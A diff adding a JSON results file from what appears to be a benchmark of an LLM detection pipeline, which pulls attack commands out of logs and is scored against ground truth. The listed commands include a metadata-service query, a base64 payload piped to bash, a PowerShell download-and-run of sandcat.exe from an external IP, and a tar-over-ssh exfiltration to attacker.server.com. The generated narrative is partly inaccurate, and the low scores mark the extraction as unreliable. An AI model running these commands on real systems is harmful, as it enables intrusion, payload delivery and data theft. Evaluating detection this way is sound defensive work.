@@ -1,0 +1,98 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "bash -c 'wget --connect-timeout=7 --tries=1 --dns-timeout=7 -q --header='Metadata:true' -O - http://169.254.169.254/metadata/instance?api-version=2019-03-11;'",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "bash -c 'echo d2hvYW1pJmlmY29uZmlnJmFycC AtYSZwaW5nIC1jIDEgMTAuN6CuMjAwLjIwMA== | base64 -d|bash'",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "bash -c '/root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/node' -p '",
+        "stage": "Execution"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --enable && ./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --exec whoami",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "sh -c './sqltool_amd64_upx --server 192.168.0.244 --user sa --password Sa123456 --exec whoami'",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "sh -c './sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec cmd /c powershell.exe -ExecutionPolicy Bypass -C $ip='https://124.223.85.207:8443';[System.Net.ServicePointManager]::ServerCertificateValidationCallback={return $true};$url=$ip+'/file/download';$wc=New-Object System.Net.WebClient;$wc.Headers.Add('company_code',1234567);$wc.Headers.Add('platform','windows');$wc.Headers.Add('file','sandcat.go');$output='C:\\Users\\Public\\sandcat.exe';$wc.DownloadFile($url,$output);start /min C:\\Users\\Public\\sandcat.exe -opid 9f726796-b4f3-463f-8cfd-4f1498314252'",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "sh -c 'del /f /q c:\\windows\\logout.jsp'",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "sh -c '/root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/out/vs/base/node/cpuUsage.sh' 294687 294943 295048 294944 295049 295125",
+        "stage": "Discovery"
+      },
+      {
+        "command": "sh -c ''./sqltool_amd64_upx --server 192.168.0.244 --user sa --password Sa123456 --exec cmd /c powershell.exe -ExecutionPolicy Bypass -C $ip='https://124.223.85.207:8443';[System.Net.ServicePointManager]::ServerCertificateValidationCallback={return $true};$url=$ip+'/file/download';$wc=New-Object System.Net.WebClient;$wc.Headers.Add('company_code',1234567);$wc.Headers.Add('platform','windows');$wc.Headers.Add('file','sandcat.go');$output='C:\\Users\\Public\\sandcat.exe';$wc.DownloadFile($url,$output);start /min C:\\Users\\Public\\sandcat.exe -opid 9f726796-b4f3-463f-8cfd-4f1498314252''",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "sh -c 'gcc -xc - < /dev/stdin -o /root/.ssh/id_rsa_priv_key;chmod 400 /root/.ssh/id_rsa_priv_key'",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "sh -c 'tar zcvf - /home/user/secret_files | openssl enc -aes-256-cbc -salt -pass pass:123456 | ssh user@attacker.server.com secret.tar.gz'",
+        "stage": "Collection"
+      },
+      {
+        "command": "sh -c 'net use \\192.168.0.254\backdoor$ /USER:admin password /persistent:no'",
+        "stage": "Lateral Movement"
+      }
+    ],
+    "narrative": "The attackers initially accessed the system through an API request using metadata service and a base64-encoded payload. They then used the Visual Studio Code Server binary to execute remote commands and scripts. The adversaries established persistent access using SQL injection techniques and scheduled tasks. Credentials were harvested and sensitive files collected. Furthermore, lateral movement was achieved over the local network.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 48568,
+      "completion_tokens": 3149,
+      "total_tokens": 51717,
+      "wall_clock_s": 35.786,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.25,
+      "recall": 0.375,
+      "f1": 0.3,
+      "tp": 3,
+      "fp": 9,
+      "fn": 5
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 12,
+      "fn": 7,
+      "recall_partial": 0.14285714285714285
+    },
+    "hallucination_rate": 0.2857142857142857,
+    "cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 48568,
+      "completion_tokens": 3149,
+      "total_tokens": 51717,
+      "wall_clock_s": 35.786,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v2_maxtok4096",
+    "max_tokens": 4096,
+    "prompt_variant": "base",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
